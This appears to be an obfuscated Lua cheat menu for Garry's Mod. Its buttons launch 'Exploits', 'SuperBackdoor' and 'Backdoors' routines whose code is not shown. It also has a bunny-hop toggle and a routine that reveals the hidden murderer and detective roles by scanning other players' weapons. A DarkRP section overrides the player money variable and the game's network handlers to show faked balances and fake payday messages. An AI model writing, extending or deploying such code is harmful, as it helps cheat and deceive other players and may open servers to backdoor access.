    button_add("Bhop", function()
        if NEAT_bhop then
            NEAT_bhop = not NEAT_bhop
            Notify("bhop " .. Disable)
            hook.Remove("HUDPaint", "hud_speed")
        else
            NEAT_bhop = not NEAT_bhop
            hook.Add("HUDPaint", "hud_speed", hud_speed)
            Notify("bhop " .. Enable)
        end
    end)

    button_add(Exploits, function()
        bn()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add(SuperBackdoor, function()
        aA()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add(Backdoors, function()
        ab()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add(AAFK, function() K() end)
    button_add(CheckMurder, function()
        for j, p in pairs(player.GetAll()) do
            for dK, dL in pairs(p:GetWeapons()) do
                if string.find(dL:GetClass(), "weapon_mu_knife") then
                    f = dL.Owner
                    h("Убийца Ник:" .. f:GetBystanderName() .. " Стим ник:" .. f:Nick())
                end

                if string.find(dL:GetClass(), "weapon_mu_magnum") then
                    f = dL.Owner
                    h("Детектив Ник:" .. f:GetBystanderName() .. " Стим ник:" .. f:Nick())
                end
            end
        end
    end)
end

if DarkRP then
    local dM = 0
    local n = LocalPlayer()
    local dN = {}
    local dO = {}
    local dP = {}
    local dQ = nil
    local dR = CurTime()
    local dS = .001
    local dT = 1
    local dU = 0
    local dV = CurTime()
    local dW = 0
    local function dX(dY)
        local dZ = string.Split(dY, ":|:")
        local d_ = {}
        for x, p in pairs(dZ) do
            table.insert(d_, string.Split(p, ":-:"))
        end
        return d_
    end

    local function e0(e1)
        local e2 = {}
        for x, p in pairs(e1) do
            table.insert(e2, p[1] .. ":-:" .. p[2])
        end

        local e3 = ""
        for x, p in pairs(e2) do
            if e3 == "" then
                e3 = p
            else
                e3 = e3 .. ":|:" .. p
            end
        end
        return e3
    end

    local function e4()
        if dO ~= {} then end
    end

    local function e5()
    end

    if e5() then
        dO = e5()
        for x, p in pairs(dO) do
            if p[1] == game.GetIPAddress() then dM = p[2] end
        end
    end

    local function e6(e7)
        local e8 = DarkRP.getPhrase("payday_message", "$" .. tostring(e7))
        GAMEMODE:AddNotify(e8, 4, 4)
        surface.PlaySound("buttons/lightswitch2.wav")
        MsgC(Color(255, 20, 20, 255), "[DarkRP] ", Color(200, 200, 200, 255), e8, "\n")
    end

    local function e9(ea, eb)
        local eb = eb or true
        local ec = tonumber(ea)
        dM = math.floor(dM + ec)
        if eb then e6(ec) end
        local ed = false
        for x, p in pairs(dO) do
            if p[1] == game.GetIPAddress() then ed = x end
        end

        if ed then table.remove(dO, ed) end
        table.insert(dO, {game.GetIPAddress(), dM})
        e4()
    end

    function setMoney(n, bJ, ea)
        local ee, ef = n:getDarkRPVar("money")
        if ea[1] == "rl" then
            e9(-dM, false)
        else
            local ec = tonumber(ea[1])
            e9(-dM + ec - ef, false)
        end
    end

    hook.Add("Think", "VarChange", function()
        if dN then
            local ee, ef = n:getDarkRPVar("money")
            if not (ee and ef) then return end
            hook.Run("DarkRPVarChanged", LocalPlayer(), "money", nil, ee)
        end

        if dQ ~= nil and dP ~= {} then
            local eg = dQ[1]
            local eh = dQ[2]
            local ac = eg:GetParent()
            if dR < CurTime() then
                dT = dT + 1
                dR = CurTime() + dP[dT].tm
            else
                eg:SetFraction(dT / table.Count(dP))
                eh:SetText("")
                eh:InsertColorChange(150, 20, 20, 255)
                eh:AppendText(dP[dT].nm .. string.rep(".", dW, ""))
            end

            if dT == table.Count(dP) then
                e9(dU)
                ac:Close()
                dP = {}
                dQ = nil
                dT = 1
            end

            if dV < CurTime() then
                dV = CurTime() + 1 / 5
                dW = dW + 1
                if dW > 4 then dW = 0 end
            end
        end
    end)

    local ei = FindMetaTable("Player")
    function ei:oldFunc(co)
        local ej = dN[self:UserID()]
        return ej and ej[co] or nil
    end

    function ei:getDarkRPVar(co)
        if co == "money" and self == n and n:oldFunc(co) ~= nil then
            return self:oldFunc(co) + dM, self:oldFunc(co)
        else
            return self:oldFunc(co)
        end
    end

    local function ek(el, co, cb)
        local n = Player(el)
        dN[el] = dN[el] or {}
        hook.Call("DarkRPVarChanged", nil, n, co, dN[el][co], cb)
        dN[el][co] = cb
        if IsValid(n) then n.DarkRPVars = dN[el] end
    end

    local function en()
        local el = net.ReadUInt(16)
        local co, cb = DarkRP.readNetDarkRPVar()
        ek(el, co, cb)
    end

    net.Receive("DarkRP_PlayerVar", en)
    local function eo()
        local el = net.ReadUInt(16)
        local ej = dN[el] or {}
        local co = DarkRP.readNetDarkRPVarRemoval()
        local n = Player(el)
        hook.Call("DarkRPVarChanged", nil, n, co, ej[co], nil)
        ej[co] = nil
    end

    net.Receive("DarkRP_PlayerVarRemoval", eo)
    local function ep(eq)
        local er = net.ReadUInt(8)
        for l = 1, er do
            local el = net.ReadUInt(16)
            local es = net.ReadUInt(DarkRP.DARKRP_ID_BITS + 2)
            for Z = 1, es do
                local co, cb = DarkRP.readNetDarkRPVar()
                ek(el, co, cb)
            end
        end
    end

    net.Receive("DarkRP_InitializeVars", ep)
    timer.Simple(0, fp{RunConsoleCommand, "_sendDarkRPvars"})
    net.Receive("DarkRP_DarkRPVarDisconnect", function(eq)
        local el = net.ReadUInt(16)
        dN[el] = nil
    end)

    timer.Create("GetVars", 3, 0, function()
        for j, p in ipairs(player.GetAll()) do
            RunConsoleCommand("_sendDarkRPvars")
            return
        end

        timer.Remove("GetVars")
    end)

    timer.Create("GetVars", 3, 0, function()
        for j, p in ipairs(player.GetAll()) do
            RunConsoleCommand("_sendDarkRPvars")
            return
        end

        timer.Remove("GetVars")
    end)
end